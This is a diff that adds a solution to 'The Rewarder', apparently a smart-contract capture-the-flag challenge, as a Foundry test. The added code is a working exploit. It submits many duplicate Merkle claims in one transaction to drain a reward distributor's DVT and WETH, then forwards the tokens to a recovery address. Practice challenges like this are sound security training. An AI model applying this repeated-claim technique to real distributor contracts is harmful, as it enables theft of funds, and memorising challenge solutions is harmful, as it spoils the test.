@@ -148,7 +148,95 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Load distribution data
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+
+        // Get raw rewards data
+        Reward[] memory dvtRewards = abi.decode(
+            vm.parseJson(
+                vm.readFile(
+                    string.concat(
+                        vm.projectRoot(),
+                        "/test/the-rewarder/dvt-distribution.json"
+                    )
+                )
+            ),
+            (Reward[])
+        );
+        Reward[] memory wethRewards = abi.decode(
+            vm.parseJson(
+                vm.readFile(
+                    string.concat(
+                        vm.projectRoot(),
+                        "/test/the-rewarder/weth-distribution.json"
+                    )
+                )
+            ),
+            (Reward[])
+        );
+
+        // Dynamically find the player's index in the distribution
+        uint256 playerIndex;
+        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+            if (dvtRewards[i].beneficiary == player) {
+                playerIndex = i;
+                break;
+            }
+        }
+
+        // Check that we've found the player's index
+        require(playerIndex != 0, "Player address not found in distribution");
+
+        // Obtain the amounts the player can claim
+        uint256 playerDVTAmount = dvtRewards[playerIndex].amount;
+        uint256 playerWETHAmount = wethRewards[playerIndex].amount;
+
+        // Calculate the number of possible claims
+        uint256 dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDVTAmount;
+        uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWETHAmount;
+        uint256 totalTxCount = dvtTxCount + wethTxCount;
+
+        // Preparing the token array
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = IERC20(address(dvt));
+        tokens[1] = IERC20(address(weth));
+
+        // Generate proofs for the player (only once)
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, playerIndex);
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, playerIndex);
+
+        // Build all claims
+        Claim[] memory claims = new Claim[](totalTxCount);
+
+        for (uint256 i = 0; i < totalTxCount; i++) {
+            if (i < dvtTxCount) {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: playerDVTAmount,
+                    tokenIndex: 0, // DVT
+                    proof: dvtProof
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: playerWETHAmount,
+                    tokenIndex: 1, // WETH
+                    proof: wethProof
+                });
+            }
+        }
+
+        // Execute all claims in a single transaction
+        distributor.claimRewards(claims, tokens);
+
+        // Transfer all recovered tokens
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
